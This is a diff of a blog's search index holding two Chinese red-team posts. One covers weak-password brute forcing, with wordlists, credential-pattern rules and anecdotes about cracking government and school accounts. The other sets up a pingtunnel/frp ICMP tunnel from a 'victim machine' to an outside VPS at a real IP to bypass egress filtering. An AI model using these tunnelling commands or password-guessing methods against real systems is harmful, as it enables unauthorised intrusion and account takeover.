@@ -1,45 +1,134 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>浅谈弱口令爆破思路</title>
-      <link href="2020/10/31/%E6%B5%85%E8%B0%88%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E6%80%9D%E8%B7%AF/"/>
-      <url>2020/10/31/%E6%B5%85%E8%B0%88%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E6%80%9D%E8%B7%AF/</url>
-      
-        <content type="html"><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>无论是内网渗透还是外网渗透，无论是web应用还是ssh、rdp、mysql等常见应用，弱口令爆破都是<strong>值得</strong>尝试的一个途径。</p><a id="more"></a><h4 id="二、字典"><a href="#二、字典" class="headerlink" title="二、字典"></a>二、字典</h4><p>字典决定了弱口令爆破的成功与否，字典分为用户名和密码。</p><p>在近几次开展的攻防演戏活动中，整理了爆破成功的大概下面几种类型。</p><h5 id="1、用户名"><a href="#1、用户名" class="headerlink" title="1、用户名"></a>1、用户名</h5><p>常见用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">Admin</span><br><span class="line">scacdmin</span><br><span class="line">strong</span><br><span class="line">user</span><br><span class="line">test</span><br><span class="line">test1</span><br><span class="line">john</span><br></pre></td></tr></table></figure><p>数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">9</span><br><span class="line">123</span><br><span class="line">860</span><br></pre></td></tr></table></figure><p>手机号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17865154061</span><br></pre></td></tr></table></figure><blockquote><p>收集那个地区的手机号进行爆破</p><p>社工公司内部员工</p></blockquote><p>姓名拼音</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yanli</span><br><span class="line">dj_yao</span><br><span class="line">yanshi</span><br></pre></td></tr></table></figure><blockquote><p>P牛的星球看到的：大型公司（员工数量5k+），可以根据中国姓名拼音Top500来做</p><p>对于千人及以下的中小型创业公司，企查查和爱企查爬一下这个公司的专利信息列表</p></blockquote><blockquote><p>使用下面的项目字典生成很简单</p><p><a href="https://github.com/LandGrey/ChineseMaskReflector">https://github.com/LandGrey/ChineseMaskReflector</a></p><p>目前我的字典包含如下（中国姓名top500），孙大圣为例</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sundasheng</span><br><span class="line">sunds</span><br><span class="line">dssun</span><br><span class="line">sds</span><br><span class="line">ds_sun</span><br><span class="line">dashengsun</span><br><span class="line">Sundasheng</span><br><span class="line">Sds</span><br></pre></td></tr></table></figure><blockquote><p>上面的也可以用到自定义密码生成中</p></blockquote><p>域名、地域名、机关名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>关键</p></blockquote><h5 id="2、密码"><a href="#2、密码" class="headerlink" title="2、密码"></a>2、密码</h5><p>常见密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">admin</span><br><span class="line">manage</span><br><span class="line">strong</span><br><span class="line">11111</span><br><span class="line">admin123!</span><br><span class="line">12345678;abc</span><br><span class="line">12345!@#$%abc</span><br><span class="line">Passw0rd</span><br><span class="line">p@ssword</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>自定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Admin&#x2F;Cx123456（cx市）</span><br><span class="line">xzadmin&#x2F;xz@123456（xz市）</span><br><span class="line">strong&#x2F;yyslj!@#123（yy市水利局）</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p></blockquote><p>先写入data.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zhejiang</span><br><span class="line">243536998</span><br><span class="line">sundasheng</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pydictor.py -extend data.txt --level 3 --len 4 16</span><br></pre></td></tr></table></figure><blockquote><p>另外一个更加自定义的工具</p><p><a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1">https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1</a></p><p>使用举例：<a href="https://www.cnblogs.com/cwkiller/p/12741086.html">https://www.cnblogs.com/cwkiller/p/12741086.html</a></p></blockquote><p>域名+数字</p><p>域名+admin</p><p>admin+域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">top100，</span><br><span class="line">mct@2020</span><br><span class="line">yanyi@mct.gov.cn</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jxsdyyyadmin**市第一医院</span><br></pre></td></tr></table></figure><blockquote><p>下面的是以前看到的，忘记出处了。结合白鹿生成器快速生成</p></blockquote><p><strong>账号规则</strong><br>以下均可尝试大小写：<br>admin+用户名缩写，比如用户叫张三，账号为adminzs<br>地名，比如地名叫傻蛋，账号为shadan<br>域名缩写，比如网站为<a href="http://www.test.com/">www.test.com</a>，账号为test<br>驻点单位名缩写_人名缩写_运维所属公司名缩写，比如驻点单位为天真傻蛋云平台，运维叫做张三，所属公司是犯贱有限公司，账号为tzsd_zs_fj<br>地名_邮编号码，比如地名是傻蛋，对应编号是000000，账号为sd_000000<br>测试账号+人名，比如anquanceshi、test、ceshi、ceshi_zs等等。<br><strong>密码规则</strong><br>以下均可尝试大小写：<br>键盘字母连键+特殊符号+键盘数字连键，字母和数字对应，比如键盘上asdf连着，密码为asdf<a href="https://www.t00ls.net/space-uid-8446.html">@1234</a><br>单位名称缩写/域名+特殊符号+3位或4位随机数，比如<a href="http://www.test.com/">www.test.com</a>，密码为test@2016<br>单位名缩写+人名缩写@工号，比如天真傻蛋大数据平台，运维叫张三，工号9541，密码为tzsdzs@9541<br>运维公司缩写+特殊符号+工号，比如天真傻蛋公司，工号是59861，密码为tzsd@59861</p><p>用户名admin</p><p>密码域名+8899</p><h5 id="3、安全设备默认口令"><a href="#3、安全设备默认口令" class="headerlink" title="3、安全设备默认口令"></a>3、安全设备默认口令</h5><blockquote><p><a href="https://www.freebuf.com/column/235632.html">https://www.freebuf.com/column/235632.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484399&amp;idx=1&amp;sn=eaba60ade227f6a26ee194dfecfac1ff&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484399&amp;idx=1&amp;sn=eaba60ade227f6a26ee194dfecfac1ff&amp;scene=21#wechat_redirect</a></p></blockquote><h4 id="三、爆破思路"><a href="#三、爆破思路" class="headerlink" title="三、爆破思路"></a>三、爆破思路</h4><p>1、固定用户名爆破密码</p><p><code>admin</code>、<code>test</code>、<code>ceshi</code></p><p>2、固定密码爆破用户名</p><p><code>123456</code>、<code>111111</code></p><p>3、用户名与密码相同</p><p>4、验证码对抗</p><p><code>Captcha-killer</code>插件</p><h4 id="四、真实案例"><a href="#四、真实案例" class="headerlink" title="四、真实案例"></a>四、真实案例</h4><h5 id="1、学校VPN"><a href="#1、学校VPN" class="headerlink" title="1、学校VPN"></a>1、学校VPN</h5><p>微博超话获取到了学生的vpn账号</p><p>入学通知获取到了姓名、学号，社工获取身份证号</p><h5 id="2、离线爆破"><a href="#2、离线爆破" class="headerlink" title="2、离线爆破"></a>2、离线爆破</h5><p>一次实战中sql注入得到了后台账号密码，加盐md5，但是只解出了一组为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin1&#x2F;admin123!</span><br></pre></td></tr></table></figure><p>根据域名等信息，并根据上面的格式生成字典爆破出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x2F;*****123!</span><br></pre></td></tr></table></figure><h5 id="3、账号密码都为域名缩写"><a href="#3、账号密码都为域名缩写" class="headerlink" title="3、账号密码都为域名缩写"></a>3、账号密码都为域名缩写</h5><p>一次实战中<code>hp**/hp**</code></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 爆破 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>pingtunnel搭建icmp隧道</title>
-      <link href="2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/"/>
-      <url>2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/</url>
-      
-        <content type="html"><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>这次实战中遇到了DNS、TCP不出网，ICMP出网的情况，而reGeorg不够稳定，于是考虑搭建ICMP隧道转发socks5流量。</p><a id="more"></a><h4 id="二、原理及工具"><a href="#二、原理及工具" class="headerlink" title="二、原理及工具"></a>二、原理及工具</h4><p>pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具。用于突破网络封锁，或是绕过WIFI网络的登陆验证，或是在某些网络加快网络传输速度。</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gk7rx68q2cj30xs0hg7bw.jpg" alt="image-20201030232122100"></p><h4 id="三、隧道搭建"><a href="#三、隧道搭建" class="headerlink" title="三、隧道搭建"></a>三、隧道搭建</h4><h5 id="1、建立ICMP通道"><a href="#1、建立ICMP通道" class="headerlink" title="1、建立ICMP通道"></a>1、建立ICMP通道</h5><p>受害机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\TEMP\pingtunnel32.exe -type client -l :4455 -s 118.178.88.46 -sock5 1</span><br></pre></td></tr></table></figure><p>vps</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server</span><br></pre></td></tr></table></figure><h5 id="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"><a href="#2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）" class="headerlink" title="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"></a>2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）</h5><blockquote><p>别用IE的套接字当做socks5代理，proxifier全局代理或者浏览器socks5插件</p><p>虚拟机测试似乎不行</p></blockquote><h5 id="3、开启frp代理"><a href="#3、开启frp代理" class="headerlink" title="3、开启frp代理"></a>3、开启frp代理</h5><p>Frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 118.178.88.46</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">http_proxy &#x3D; socks5:&#x2F;&#x2F;127.0.0.1:4455</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6667</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>这里的关键是frp去连接服务端时需要配置本地socks5代理。</p><hr><p>最后，感谢戴哥哥和超哥的耐心解答。</p><h4 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h4><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 代理 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-  
-  
+<search>
+  <entry>
+    <title>pingtunnel搭建icmp隧道</title>
+    <url>/2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/</url>
+    <content><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>这次实战中遇到了DNS、TCP不出网，ICMP出网的情况，而reGeorg不够稳定，于是考虑搭建ICMP隧道转发socks5流量。</p>
+<a id="more"></a>
+
+<h4 id="二、原理及工具"><a href="#二、原理及工具" class="headerlink" title="二、原理及工具"></a>二、原理及工具</h4><p>pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具。用于突破网络封锁，或是绕过WIFI网络的登陆验证，或是在某些网络加快网络传输速度。</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gk7rx68q2cj30xs0hg7bw.jpg" alt="image-20201030232122100"></p>
+<h4 id="三、隧道搭建"><a href="#三、隧道搭建" class="headerlink" title="三、隧道搭建"></a>三、隧道搭建</h4><h5 id="1、建立ICMP通道"><a href="#1、建立ICMP通道" class="headerlink" title="1、建立ICMP通道"></a>1、建立ICMP通道</h5><p>受害机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F:\TEMP\pingtunnel32.exe -type client -l :4455 -s 118.178.88.46 -sock5 1</span><br></pre></td></tr></table></figure>
+
+<p>vps</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"><a href="#2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）" class="headerlink" title="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"></a>2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）</h5><blockquote>
+<p>别用IE的套接字当做socks5代理，proxifier全局代理或者浏览器socks5插件</p>
+<p>虚拟机测试似乎不行</p>
+</blockquote>
+<h5 id="3、开启frp代理"><a href="#3、开启frp代理" class="headerlink" title="3、开启frp代理"></a>3、开启frp代理</h5><p>Frpc.ini</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 118.178.88.46</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">http_proxy &#x3D; socks5:&#x2F;&#x2F;127.0.0.1:4455</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6667</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure>
+
+<p>这里的关键是frp去连接服务端时需要配置本地socks5代理。</p>
+<hr>
+<p>最后，感谢戴哥哥和超哥的耐心解答。</p>
+<h4 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h4><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+]]></content>
+      <tags>
+        <tag>代理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅谈弱口令爆破思路</title>
+    <url>/2020/10/31/%E6%B5%85%E8%B0%88%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>无论是内网渗透还是外网渗透，无论是web应用还是ssh、rdp、mysql等常见应用，弱口令爆破都是<strong>值得</strong>尝试的一个途径。</p>
+<a id="more"></a>
+
+<h4 id="二、字典"><a href="#二、字典" class="headerlink" title="二、字典"></a>二、字典</h4><p>字典决定了弱口令爆破的成功与否，字典分为用户名和密码。</p>
+<p>在近几次开展的攻防演戏活动中，整理了爆破成功的大概下面几种类型。</p>
+<h5 id="1、用户名"><a href="#1、用户名" class="headerlink" title="1、用户名"></a>1、用户名</h5><p>常见用户名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">Admin</span><br><span class="line">scacdmin</span><br><span class="line">strong</span><br><span class="line">user</span><br><span class="line">test</span><br><span class="line">test1</span><br><span class="line">john</span><br></pre></td></tr></table></figure>
+
+<p>数字</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">9</span><br><span class="line">123</span><br><span class="line">860</span><br></pre></td></tr></table></figure>
+
+<p>手机号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17865154061</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>收集那个地区的手机号进行爆破</p>
+<p>社工公司内部员工</p>
+</blockquote>
+<p>姓名拼音</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yanli</span><br><span class="line">dj_yao</span><br><span class="line">yanshi</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>P牛的星球看到的：大型公司（员工数量5k+），可以根据中国姓名拼音Top500来做</p>
+<p>对于千人及以下的中小型创业公司，企查查和爱企查爬一下这个公司的专利信息列表</p>
+</blockquote>
+<blockquote>
+<p>使用下面的项目字典生成很简单</p>
+<p><a href="https://github.com/LandGrey/ChineseMaskReflector">https://github.com/LandGrey/ChineseMaskReflector</a></p>
+<p>目前我的字典包含如下（中国姓名top500），孙大圣为例</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sundasheng</span><br><span class="line">sunds</span><br><span class="line">dssun</span><br><span class="line">sds</span><br><span class="line">ds_sun</span><br><span class="line">dashengsun</span><br><span class="line">Sundasheng</span><br><span class="line">Sds</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>上面的也可以用到自定义密码生成中</p>
+</blockquote>
+<p>域名、地域名、机关名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>关键</p>
+</blockquote>
+<h5 id="2、密码"><a href="#2、密码" class="headerlink" title="2、密码"></a>2、密码</h5><p>常见密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123456</span><br><span class="line">admin</span><br><span class="line">manage</span><br><span class="line">strong</span><br><span class="line">11111</span><br><span class="line">admin123!</span><br><span class="line">12345678;abc</span><br><span class="line">12345!@#$%abc</span><br><span class="line">Passw0rd</span><br><span class="line">p@ssword</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>自定义</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Admin&#x2F;Cx123456（cx市）</span><br><span class="line">xzadmin&#x2F;xz@123456（xz市）</span><br><span class="line">strong&#x2F;yyslj!@#123（yy市水利局）</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p>
+</blockquote>
+<p>先写入data.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zhejiang</span><br><span class="line">243536998</span><br><span class="line">sundasheng</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python pydictor.py -extend data.txt --level 3 --len 4 16</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>另外一个更加自定义的工具</p>
+<p><a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1">https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1</a></p>
+<p>使用举例：<a href="https://www.cnblogs.com/cwkiller/p/12741086.html">https://www.cnblogs.com/cwkiller/p/12741086.html</a></p>
+</blockquote>
+<p>域名+数字</p>
+<p>域名+admin</p>
+<p>admin+域名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">top100，</span><br><span class="line">mct@2020</span><br><span class="line">yanyi@mct.gov.cn</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jxsdyyyadmin	**市第一医院</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>下面的是以前看到的，忘记出处了。结合白鹿生成器快速生成</p>
+</blockquote>
+<p><strong>账号规则</strong><br>以下均可尝试大小写：<br>admin+用户名缩写，比如用户叫张三，账号为adminzs<br>地名，比如地名叫傻蛋，账号为shadan<br>域名缩写，比如网站为<a href="http://www.test.com/">www.test.com</a>，账号为test<br>驻点单位名缩写_人名缩写_运维所属公司名缩写，比如驻点单位为天真傻蛋云平台，运维叫做张三，所属公司是犯贱有限公司，账号为tzsd_zs_fj<br>地名_邮编号码，比如地名是傻蛋，对应编号是000000，账号为sd_000000<br>测试账号+人名，比如anquanceshi、test、ceshi、ceshi_zs等等。<br><strong>密码规则</strong><br>以下均可尝试大小写：<br>键盘字母连键+特殊符号+键盘数字连键，字母和数字对应，比如键盘上asdf连着，密码为asdf<a href="https://www.t00ls.net/space-uid-8446.html">@1234</a><br>单位名称缩写/域名+特殊符号+3位或4位随机数，比如<a href="http://www.test.com/">www.test.com</a>，密码为test@2016<br>单位名缩写+人名缩写@工号，比如天真傻蛋大数据平台，运维叫张三，工号9541，密码为tzsdzs@9541<br>运维公司缩写+特殊符号+工号，比如天真傻蛋公司，工号是59861，密码为tzsd@59861</p>
+<p>用户名admin</p>
+<p>密码域名+8899</p>
+<h5 id="3、安全设备默认口令"><a href="#3、安全设备默认口令" class="headerlink" title="3、安全设备默认口令"></a>3、安全设备默认口令</h5><blockquote>
+<p><a href="https://www.freebuf.com/column/235632.html">https://www.freebuf.com/column/235632.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484399&amp;idx=1&amp;sn=eaba60ade227f6a26ee194dfecfac1ff&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484399&amp;idx=1&amp;sn=eaba60ade227f6a26ee194dfecfac1ff&amp;scene=21#wechat_redirect</a></p>
+</blockquote>
+<h4 id="三、爆破思路"><a href="#三、爆破思路" class="headerlink" title="三、爆破思路"></a>三、爆破思路</h4><p>1、固定用户名爆破密码</p>
+<p><code>admin</code>、<code>test</code>、<code>ceshi</code></p>
+<p>2、固定密码爆破用户名</p>
+<p><code>123456</code>、<code>111111</code></p>
+<p>3、用户名与密码相同</p>
+<p>4、验证码对抗</p>
+<p><code>Captcha-killer</code>插件</p>
+<h4 id="四、真实案例"><a href="#四、真实案例" class="headerlink" title="四、真实案例"></a>四、真实案例</h4><h5 id="1、学校VPN"><a href="#1、学校VPN" class="headerlink" title="1、学校VPN"></a>1、学校VPN</h5><p>微博超话获取到了学生的vpn账号</p>
+<p>入学通知获取到了姓名、学号，社工获取身份证号</p>
+<h5 id="2、离线爆破"><a href="#2、离线爆破" class="headerlink" title="2、离线爆破"></a>2、离线爆破</h5><p>一次实战中sql注入得到了后台账号密码，加盐md5，但是只解出了一组为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin1&#x2F;admin123!</span><br></pre></td></tr></table></figure>
+
+<p>根据域名等信息，并根据上面的格式生成字典爆破出</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x2F;*****123!</span><br></pre></td></tr></table></figure>
+
+<h5 id="3、账号密码都为域名缩写"><a href="#3、账号密码都为域名缩写" class="headerlink" title="3、账号密码都为域名缩写"></a>3、账号密码都为域名缩写</h5><p>一次实战中<code>hp**/hp**</code></p>
+]]></content>
+      <tags>
+        <tag>爆破</tag>
+      </tags>
+  </entry>
 </search>
